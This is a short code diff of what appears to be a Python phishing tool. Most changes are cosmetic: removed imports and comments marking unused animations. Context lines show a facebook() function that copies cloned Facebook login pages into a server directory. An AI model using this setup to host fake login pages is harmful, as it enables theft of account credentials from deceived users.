@@ -9,10 +9,10 @@ import json
 import multiprocessing
 import requests
 from base.Configurations import *
-import pyvirtualdisplay
+
 from urllib.request import urlopen
 from subprocess import check_output, CalledProcessError
-from pyvirtualdisplay import Display
+
 import subprocess
 import threading
 
@@ -50,7 +50,7 @@ def banner():
     print(RED+"   ▒ ▒░         ▒        ░  ▒  ░    ░           ░  ░     ▒"+RESET)
     print("\n")
     time.sleep(0.35)
-#Animation copied from Kickthemout
+#Animation copied from Kickthemout#not used
 def CYANAnimation(text):
     try:
         global stopCYANAnimation
@@ -83,6 +83,7 @@ def PINKAnimation(text):
             time.sleep(0.1)
     except:
         os._exit(1)
+#not used        
 def YELLOWAnimation(text):
     try:
         global stopYELLOWAnimation
@@ -147,7 +148,7 @@ def facebook():
     with open('./SERVER/verify.html', 'w') as file:
             file.write(filedata)
     file.close()
-
+#i could use copy_tree but i was too lazy to write less #NOSENSE
     os.system("cp WebPages/facebook/login.php SERVER/")
     os.system("cp WebPages/facebook/mobile.html SERVER/")
     os.system("cp WebPages/facebook/index.html SERVER/")
